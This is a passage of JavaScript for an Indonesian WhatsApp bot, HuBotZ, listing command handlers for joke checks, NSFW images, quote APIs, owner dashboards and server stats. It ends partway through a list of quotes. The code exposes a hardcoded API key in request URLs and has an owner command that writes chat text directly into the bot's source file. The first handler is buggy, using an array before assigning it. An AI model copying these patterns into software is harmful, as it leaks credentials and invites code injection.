if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!m.isGroup) return replygcHuBotZ(mess.OnlyGroup)
if (!isNsfw) return replygcHuBotZ('_Fitur NSFW Belum Diaktifkan!_')
reply(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGDEEPAK/DeepakMedia/master/foot.json')
HuBotZ.sendMessage(m.chat, { image: { url: yeha }, caption : '_Done Ngab_' }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
// Fun Menu
case 'apakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'bisakah': {
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'bagaimanakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'rate': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'gantengcek': case 'cekganteng': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break           
case 'cantikcek': case 'cekcantik': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'kapankah': {
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'wangy': {
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'rules': 
case 'aturanbot': {
var cpt = `Peraturan Penggunaan Bot :\n- Dilarang Spam\n- Dilarang Menelpon Bot\n- Dilarang Mengirim Virus Ke Bot\n\nCatatan :\nSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
await HuBotZ.sendMessage(m.chat, {
text: cpt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'infobot': case 'botinfo': {
addCountCmd('#infobot', m.sender, _cmd)
var capt = `_*${global.botname} Information*_

*• Name :* ${HuBotZ.users.name}
*• Number :* ${global.botnumber.split("@")[0]}
*• Owner :* ${prefix}owner
*• Total Pengguna :* ${users.length}
*• Prefix :* ${prefix}
`
await HuBotZ.sendMessage(m.chat, {
text: capt,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: global.thumb,
sourceUrl: global.wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'dashboard':
if (!isCreator) return reply(OnlyOwner)
addCountCmd('#dashboard', m.sender, _cmd)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
_cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
_cmd.sort((a, b) => (a.count < b.count) ? 1 : -1)
var posi = await getPosiCmdUser(m.sender, _cmdUser)
var jumlahCmd = _cmd.length
if (jumlahCmd > 10) jumlahCmd = 10
var jumlah = _cmdUser[posi].db.length
if (jumlah > 5) jumlah = 5
var totalUser = 0
for (let x of _cmdUser[posi].db) {
totalUser = totalUser + x.count
}
var total = 0
for (let o of _cmd) {
total = total + o.count
}
var teks = `* DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
teks += `*Most Command Global*\n`
for (let u = 0; u < jumlahCmd; u ++) {
teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
}
teks += `\n*Most Command User*\n`
for (let i = 0; i < jumlah; i ++) {
teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
}
reply(teks)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'owner': {
const repf = await HuBotZ.sendMessage(from, {
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [m.sender] }, { quoted: m })
HuBotZ.sendMessage(from, { text : `🇺🇸 Hi @${m.sender.split("@")[0]}, This is my owner, If you find a bug, report it to the owner!\n\n🇮🇩 Hai @${m.sender.split("@")[0]}, Ini adalah owner ku, jika kamu menemukan bug laporkan kepada owner!`, mentions: [m.sender]}, { quoted: repf })
addCountCmd(`#${command}`, m.sender, _cmd);
}
break
case 'addcase': {
               if (!isCreator) return reply(mess.OnlyOwner);
               if (!text) return reply('Contoh:\n.addcase case \'tes\':\nreply(\'berhasil\')\nbreak');
               if (!text.includes("case '")) return reply("😔 case nya harus gini case '");
               let code = fs.readFileSync('HuBotZ.js', 'utf8');
               let indexSwitchCommand = code.indexOf('// Created By ArxzyDev');
               if (indexSwitchCommand !== -1) {
                  const newCase = `${text}\n\n\n\n\n`;
                  code = code.slice(0, indexSwitchCommand + 20) + divider + newCase + code.slice(indexSwitchCommand + 20);
                  fs.writeFileSync('HuBotZ.js', code);
                  newReply(mess.done);
               } else {
                  newReply(mess.emror.feature);
               }
addCountCmd(`#${command}`, m.sender, _cmd);
            }
            break
case 'cekdrive': case 'drive':
var result = await nou.drive.info();
addCountCmd('#cekdrive', m.sender, _cmd)
reply(`*Drive Server Info*\n\n *• Total :* ${result.totalGb} GB\n *• Used :* ${result.usedGb} GB (${result.usedPercentage}%)\n *• Free :* ${result.freeGb} GB (${result.freePercentage}%)`)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'cekbandwidth': case'bandwidth':
reply(mess.wait);
addCountCmd('#cekbandwidth', m.sender, _cmd)
var { download, upload } = await checkBandwidth();
reply(`*Bandwidth Server*\n\n*>* Upload : ${upload}\n*>* Download : ${download}`)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'cekprem': case 'cekpremium':
if (!isPremium) return reply(`Lu bukan user premium😂`)
addCountCmd('#cekpremium', m.sender, _cmd)
if (isCreator) return reply(`Lu Owner Tolol`)
if (_prem.getPremiumExpired(m.sender, premium) == "PERMANENT") return reply(`PERMANENT`)
let cekvip = ms(_prem.getPremiumExpired(m.sender, premium) - Date.now())
let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
m.reply(premiumnya)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'listpremium': case 'listprem':
if (!isCreator) return reply(mess.OnlyOwner)
let txt = `*List Premium User*\n=> Jumlah : ${premium.length}\n\n`
let men = [];
for (let i of premium) {
men.push(i.id)
txt += `*ID :* @${i.id.split("@")[0]}\n`
if (i.expired === 'PERMANENT') {
let cekvip = 'PERMANENT'
txt += `*Expired :* PERMANENT\n\n`
} else {
let cekvip = ms(i.expired - Date.now())
txt += `*Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
}
}
HuBotZ.sendTextWithMentions(m.chat, txt, m)
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'listsewa':
let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
let data_array = [];
for (let x of sewa) {
addCountCmd('#listsewa', m.sender, _cmd)
list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
if (x.expired === 'PERMANENT') {
let ceksewa = 'PERMANENT'
list_sewa_list += `*Expire :* PERMANENT\n\n`
} else {
let ceksewa = ms(x.expired - Date.now())
list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
}
}
HuBotZ.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
addCountCmd(`#${command}`, m.sender, _cmd);
break
case 'ping': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHz)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcHuBotZ(respon)
addCountCmd(`#${command}`, m.sender, _cmd);
            }
            break
/*case 'speedtestapi':
case 'speedtest': {
if (!isCreator) return reply(mess.OnlyOwner)
const execute = promisify(execCallback);
try {
  await m.reply('Please wait, conducting speed test...')
    const testData = await executeCommands(['python3 speed.py --share --json']);
    if (!testData) return reply('Error during speedtest');
    const {
      server,
      download,
      upload,
      client,
      timestamp,
      bytes_sent,
      bytes_received,
    } = testData;
    
    const resultMessage = `
🔭 Testing From ${client.isp}...
📑 Retrieving speedtest.net server list...
🔎 Selecting best server based on ping...

🏬 *Hosted By:* ${server.sponsor}
🌎 *Location:* ${server.name} [${server.d.toFixed(2)} km] 
⚡ *Ping:* ${server.latency.toFixed(3)} ms

*Download Speed:* ${formatSpeed(download)} Mbps
*Upload Speed:* ${formatSpeed(upload)} Mbps

*Client Info:*
  *IP:* ${client.ip}
  *ISP:* ${client.isp}
  *ISP Rating:* ${client.isprating}
  *Country:* ${client.country}

*Timestamp:* ${formatTimestamp(timestamp)}
*Bytes Sent:* ${formatBytes(bytes_sent)}
*Bytes Received:* ${formatBytes(bytes_received)}
    `;

    await HuBotZ.sendMessage(m.chat, {
    text: resultMessage,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          body: "S P E E D T E S T",
          containsAutoReply: true,
          mediaType: 1,
          mediaUrl: 'https://www.speedtest.net/id',
          renderLargerThumbnail: true,
          showAdAttribution: true,
          sourceUrl: 'https://www.speedtest.net/id',
          thumbnail: (await HuBotZ.getFile(testData.share)).data,
          thumbnailUrl: testData.share,
          title: " B Y O O K L A ",
        },
      },
    }, { quoted: m});
  } catch (error) {
    console.error(error);
    conn.reply(m.chat, 'Error during speedtest', m);
  }
}
break*/
case 'infogempa': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let tod = await fetchJson(`https://api.zahwazein.xyz/information/bmkg/gempa?apikey=${global.ZenzKey}`)
const tanggal = tod.result.tanggal
const date = tod.result.datetime
const jam = tod.result.jam
const koordinat = tod.result.coordinates
const lintang = tod.result.lintang
const bujur = tod.result.bujur
const magnitudo = tod.result.magnitude
const kedalaman = tod.result.kedalaman
const wilayah = tod.result.wilayah
const potensi = tod.result.potensi
const dirasakan = tod.result.dirasakan

var capt = `_*Info Gempa*_

*• Tanggal :* ${tanggal}
*• Datetime :* ${date}
*• Jam :* ${jam}
*• Koordinat :* ${koordinat}
*• Lintang :* ${lintang}
*• Bujur :* ${bujur}
*• Magnitudo :* ${magnitudo}
*• Kedalaman :* ${kedalaman}
*• Wilayah :* ${wilayah}
*• Potensi :* ${potensi}
*• Dirasakan :* ${dirasakan}
`
await HuBotZ.sendMessage(m.chat, { image: {url: tod.result.shakemap}, caption: capt}, {quoted:m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'ptl':
case 'penyegartimeline':
case 'penyegar': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit);
let sebelum = `https://key.anyacute.my.id/api/ptl?apikey=8SJ6MrOB`;
let masihbelom = await fetch(sebelum);
let sesudah = await masihbelom.json();
let yangdahjadi = sesudah.result;
HuBotZ.sendMessage(from, {
    audio: {
        url: yangdahjadi
    }, mimetype: 'audio/mpeg', ptt:true },
{ quoted: m });
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1;
}
break
case 'quotes': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let sebelum = await fetchJson(`https://key.anyacute.my.id/api/quotes?apikey=8SJ6MrOB`)
let cpt = `*Quotes* : ${sebelum.quotes}\n*Author* : ${sebelum.author}`
m.reply(cpt)
addCountCmd(`#${command}`, m.sender, _cmd);
db.data.users[m.sender].limit -= 1
}
break
case 'quotesbucin': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let tod = await fetchJson(`https://api.zahwazein.xyz/randomtext/bucinquote?apikey=${global.ZenzKey}`)
const bucin = tod.result.message
HuBotZ.sendMessage(m.chat, {text: bucin}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'quotesdilan':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let tod = await fetchJson(`https://api.zahwazein.xyz/randomtext/dilanquote?apikey=${global.ZenzKey}`)
const dilan = tod.result.message
HuBotZ.sendMessage(m.chat, {text: dilan}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
case 'quotesjawa': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let tod = await fetchJson(`https://api.zahwazein.xyz/randomtext/jawaquote?apikey=${global.ZenzKey}`)
const jawa = tod.result.message
HuBotZ.sendMessage(m.chat, {text: jawa}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
break
 case 'quotesanime':{
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
let tod = await fetchJson(`https://api.zahwazein.xyz/randomtext/animequotes?apikey=${global.ZenzKey}`)
const anime = tod.result.character
const quotes = tod.result.quotes
HuBotZ.sendMessage(m.chat, {text: `${quotes}\n\n\n-By ${anime}`}, {quoted: m})
addCountCmd(`#${command}`, m.sender, _cmd);
}
db.data.users[m.sender].limit -= 1
 break
case 'galau': {
if (!isRegistered) return reply(`You are not registered in the database yet!\nType ${prefix}register Human|16`);
if (!isPremium && db.data.users[m.sender].limit < 1) return m.reply(mess.EndLimit)
const galau = [
  'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji',
  'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\n~vinaa',
  "What's the point of us being close yesterday?\n~Vinaa",
  'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\n*BY PUTRI*',
  'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\n*BY PUTRI*',
  'Dia sesuka hati, kamu setulus hati.\n*BY PUTRI*',
  'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\n\nBy putri',
  'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\n*BY PUTRI*',
  'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\n*BY PUTRI*',
  'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\n*BY PUTRI*',
  'Sorry,gue ga kuat buat semuanya ,mksi ya\n\n*BY PUTRI*',
  'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\n*BY PUTRI*',
  'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\n*BY INDI*',
  'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu',
  'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu',
  'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu',
  'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu',
  'Tak semudah itu melupakanmu',
  'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya',
  'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya',
  'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya',
  'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama',
  'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya',
  'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku',
  'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati',
  'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya',
  'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu',
  'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat',
  'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya',
  'Tolong jangan pergi saat aku sudah sangat sayang padamu',
  'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget',
  'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu',
  'Sakit itu ketika cinta yang aku beri tidak kamu hargai',
  'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu',
  'Karenamu aku jadi tau cinta yang sesungguhnya',
  'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih',
  'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai',
  'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa',
  'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis',
  'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa',
  'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama',
  'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan',
  'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat',
  'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa',
  'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku',
  'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia',
  'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali',
  'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu',
  'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu',
  'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri',
  'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku',
  'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka',
  'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu',
  'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan',
  'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina',
  'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri',
  'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja',
  'Aku berdiri disini sendiri menunggu kehadiran dirimu',
  'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran',
  'Maaf aku lupa ternyata aku bukan siapa-siapa',
  'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu',
  'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku',
  'Jangan buat aku terlalu berharap jika kamu tidak menginginkanku',
  'Lebih baik sendiri daripada berdua tapi tanpa kepastian',
  'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri',
  'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar',
  'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi',
  'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki',
  'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu',
  'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau',
  'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa',
  'Aku bukan mencari yang sempurna tapi yang terbaik untukku',
  'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan',
  'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka',
  'Terima kasih karena kamu aku menjadi lupa tentang masa laluku',
  'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja',
  'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati',
  'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila',
  'Dari sekian lama menunggu apa yang sudah didapat',
  'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali',
  'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya',
  'Aku terlahir sederhana dan ditinggal sudah biasa',
  'Aku sayang kamu tapi aku masih takut untuk mencintaimu',
